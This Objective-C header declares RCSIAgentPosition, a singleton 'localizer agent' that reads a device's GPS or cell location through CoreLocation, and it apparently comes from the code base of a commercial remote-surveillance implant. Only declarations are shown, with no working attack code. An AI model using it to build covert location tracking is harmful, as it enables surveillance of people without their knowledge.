/*
 * RCSIAgentLocalizer.h
 *  Localizer Agent - through GPS or GSM cell
 *
 *
 * Created by Alfredo 'revenge' Pesoli on 07/10/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Foundation/Foundation.h>
#import <CoreLocation/CoreLocation.h>


#ifndef __RCSIAgentPosition_h__
#define __RCSIAgentPosition_h__

#import "RCSICommon.h"


@interface RCSIAgentPosition : NSObject <Agents, CLLocationManagerDelegate>
{
@private
  NSMutableDictionary *mAgentConfiguration;
  BOOL                 mIsRunning;
  
  NSString            *mCurrentLatitude;
  NSString            *mCurrentLongitude;
  CLLocationManager   *mLocationManager;
  CLLocation          *mCurrentLocation;
}

@property (nonatomic, retain) NSString *mCurrentLatitude;
@property (nonatomic, retain) NSString *mCurrentLongitude;
@property (nonatomic, retain) CLLocationManager *mLocationManager;
@property (nonatomic, retain) CLLocation *mCurrentLocation;

@property (retain, readwrite) NSMutableDictionary    *mAgentConfiguration;
@property (readonly)          BOOL                    mIsRunning;

+ (RCSIAgentPosition *)sharedInstance;
+ (id)allocWithZone: (NSZone *)aZone;
- (id)copyWithZone: (NSZone *)aZone;
- (id)retain;
- (unsigned)retainCount;
- (void)release;
- (id)autorelease;
- (id)init;

@end

#endif